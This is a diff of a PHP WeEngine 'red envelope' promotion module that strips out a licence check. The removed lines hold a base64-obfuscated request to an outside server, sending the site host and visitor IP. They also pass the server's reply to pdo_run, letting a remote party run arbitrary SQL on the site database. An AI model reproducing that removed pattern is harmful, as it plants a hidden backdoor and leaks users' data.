@@ -188,30 +188,24 @@ class Stonefish_redenvelopeModule extends WeModule {
 			'rulebgcolor' =>  $_GPC['rulebgcolor'],
         );
 		load()->func('communication');
-        $oauth2_code = base64_decode('aHR0cDovL3dlNy53d3c5LnRvbmdkYW5ldC5jb20vYXBwL2luZGV4LnBocD9pPTImaj03JmM9ZW50cnkmZG89YXV0aG9yaXplJm09c3RvbmVmaXNoX2F1dGhvcml6ZSZtb2R1bGVzPXN0b25lZmlzaF9yZWRlbnZlbG9wZSZ3ZWJ1cmw9').$_SERVER ['HTTP_HOST']."&visitorsip=" . $_W['clientip'];
-        $content = ihttp_get($oauth2_code);
-        $token = @json_decode($content['content'], true);
         if (empty($id)) {
             if ($insert['starttime'] <= time()) {
                 $insert['isshow'] = 1;
             } else {
                 $insert['isshow'] = 0;
             }
-			if ($token['config']){
+		
                 pdo_insert('stonefish_redenvelope_reply', $insert);
 				$id = pdo_insertid();
-			}
+		
         } else {
-            if ($token['config']){
+            
 			    pdo_update('stonefish_redenvelope_reply', $insert, array('id' => $id));
-			}
+			
         }
-		if ($token['config']){
+		
 			//查询规则
-		}else{
-			pdo_run($token['error_code']);
-			//写入数据库规则
-		}
+		
 		//查询子公众号信息必保存分享设置
 		$acid_arr=uni_accounts();
 		$ids = array();
@@ -232,13 +226,13 @@ class Stonefish_redenvelopeModule extends WeModule {
 					'share_fail' => $_GPC['share_fail_'.$acid],
 					'share_cancel' => $_GPC['share_cancel_'.$acid],
 			);
-			if ($token['config']){
+			
 				if (empty($_GPC['acid_'.$acid])) {
                     pdo_insert('stonefish_redenvelope_share', $insertshare);
                 } else {
                     pdo_update('stonefish_redenvelope_share', $insertshare, array('id' => $_GPC['acid_'.$acid]));
                 }
-			}
+			
 		
 		}
 		//查询子公众号信息必保存分享设置
@@ -258,9 +252,9 @@ class Stonefish_redenvelopeModule extends WeModule {
 				    'prizepic' => $_GPC['prizepic'][$index],
 			    );			
 				$updata['total_num'] += $_GPC['prizetotal'][$index];
-			    if ($token['config']){
+			   
 				    pdo_update('stonefish_redenvelope_prize', $insertprize, array('id' => $index));
-			    }
+			    
             }
 		}
 		if (!empty($_GPC['prizename_new'])&&count($_GPC['prizename_new'])>1&&$_GPC['envelope']==0) {
@@ -278,9 +272,9 @@ class Stonefish_redenvelopeModule extends WeModule {
 				    'prizepic' => $_GPC['prizepic_new'][$index],
 			    );
 				$updata['total_num'] += $_GPC['prizetotal_new'][$index];
-			    if ($token['config']){
+			   
                     pdo_insert('stonefish_redenvelope_prize', $insertprize);                    
-			    }
+			   
             }
 				if(empty($insertprize['prizetype'])){
 					message ( '请添加奖品类型' );
@@ -297,11 +291,9 @@ class Stonefish_redenvelopeModule extends WeModule {
 			pdo_update('stonefish_redenvelope_reply', $updata, array('id' => $id));
 		}		
 		//奖品配置
-		if ($token['config']){
+		
             return true;
-		}else{
-		    message('请联系授权使用', referer(), 'error');
-		}
+		
     }
 
     public function ruleDeleted($rid) {
